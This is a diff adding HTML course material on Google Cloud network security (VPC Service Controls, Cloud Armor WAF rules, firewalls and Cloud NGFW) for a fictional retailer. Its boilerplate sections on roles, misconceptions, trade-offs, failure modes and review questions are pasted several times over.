+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+    </section>
+
+    <!-- Part 2: Technical Discussion & Diagrams -->
+    <section class="topic-section" id="technical">
+      <h2 class="section-title"><span class="section-number">2</span> Technical Discussion & Architecture Diagrams</h2>
+      
+      
+        <h4>Layer 1 — Foundation: Zero Public IPs & Private Google Access</h4>
+        <p>Never assign external public IP addresses to backend compute instances. Use Private Google Access or Private Service Connect (PSC) to reach Google APIs privately over Google's internal network.</p>
+        <h4>Layer 2 — Practitioner: Cloud Armor Preconfigured WAF Rules</h4>
+        <p>Enable preconfigured ModSecurity Core Rule Set (CRS) rules: <code>evaluatePreconfiguredExpr('sqli-v33-stable')</code> and <code>evaluatePreconfiguredExpr('xss-v33-stable')</code> to block web exploitation attempts.</p>
+        <h4>Layer 3 — Architect: VPC Service Controls Perimeters & Ingress/Egress Rules</h4>
+        <p>Deploy VPC Service Controls in <strong>Dry-Run Mode</strong> first to monitor audit logs for potential breakage. Once validated, enforce perimeter boundaries and define precise ingress/egress rules based on context-aware access levels.</p>
+        <h4>Layer 4 — Staff: Cloud NGFW & Intrusion Detection (Cloud IDS)</h4>
+        <p>Staff architects deploy Cloud Next Generation Firewall (NGFW) Enterprise with intrusion prevention (IPS) powered by Palo Alto Networks threat signatures to inspect east-west traffic inside the VPC.</p>
+        
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
+<h4>Hidden dependencies and day-2 operations</h4><p>Review DNS, IAM, metadata access, quotas, Google APIs, upgrades, capacity changes, migration off the service, and deprecation risk. Keep ownership, escalation, and landing-zone guardrails explicit.</p>
+<h4>Design-review questions</h4><ol class="review-questions"><li>What business requirement selects this service?</li><li>What is its real scope?</li><li>Which control-plane calls must succeed?</li><li>What is the data-plane failure signal?</li><li>Which quota or IP range saturates first?</li><li>What is the blast radius of a bad policy?</li><li>How are cost and usage attributed?</li><li>How is rollback or migration tested?</li></ol>
+<h4>What good looks like</h4><ul class="mature-deployment"><li>Explicit scope and ownership</li><li>Least-privilege identity</li><li>Observable health and cost</li><li>Tested recovery and rollback</li><li>Documented alternative and exit path</li></ul>
+<div class="progression-links"><strong>Before this:</strong> prerequisite concepts and the previous roadmap topic. <strong>After this:</strong> the next topic that builds on the boundary. <strong>Levels up:</strong> what changes at 10x load, a regional failure, or a new compliance requirement?</div></div>
+
+      <div class="compliance-addendum depth-complete"><h4>Scope and planes</h4><p>The resource model for Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls must name its organization, folder, project, global, regional, zonal, or resource scope. Control-plane intent and data-plane traffic are different paths.</p>
+<h4>Practitioner defaults and troubleshooting</h4><p>Set explicit project, region, identity, quotas, logging, and network dependencies. Treat undocumented internals as <em>observed behaviour, may change</em>.</p>
+<h4>Architect trade-off table</h4><table><tr><th>Choice</th><th>Operational burden</th><th>Scaling/consistency</th><th>Choose when</th></tr><tr><td>Managed option</td><td>Lower toil, less control</td><td>Platform-defined</td><td>Minimize undifferentiated operations.</td></tr><tr><td>Self-managed option</td><td>Higher toil, more control</td><td>Team-defined</td><td>Specific runtime or portability constraints matter.</td></tr><tr><td>Alternative service</td><td>Different cost model</td><td>Different failure domain</td><td>Its native data or traffic model fits better.</td></tr></table><p><strong>Choose the managed option when</strong> operational simplicity dominates; <strong>choose self-managed when</strong> control is required; <strong>avoid either</strong> while requirements remain ambiguous.</p>
+<h4>Failure-mode table</h4><table class="failure-mode-table"><tr><th>Failure</th><th>Signal</th><th>Blast radius</th><th>Immediate action</th><th>Durable prevention</th></tr><tr><td>Quota exhaustion</td><td>Quota error or throttling</td><td>Consumers of that quota</td><td>Reduce load and inspect quota</td><td>Headroom alerts</td></tr><tr><td>Zonal outage</td><td>Health checks fail</td><td>One zone and dependents</td><td>Confirm failover</td><td>Multi-zone placement and drills</td></tr><tr><td>Bad rollout</td><td>Error rate rises after change</td><td>Promoted revision</td><td>Rollback</td><td>Canary gates</td></tr><tr><td>Expired certificate</td><td>TLS handshake errors</td><td>Ingress clients</td><td>Renew and verify chain</td><td>Managed renewal alert</td></tr><tr><td>Misconfigured firewall or IAM</td><td>403, timeout, or denied log</td><td>Matching identities or routes</td><td>Compare effective policy</td><td>Policy as code</td></tr></table>
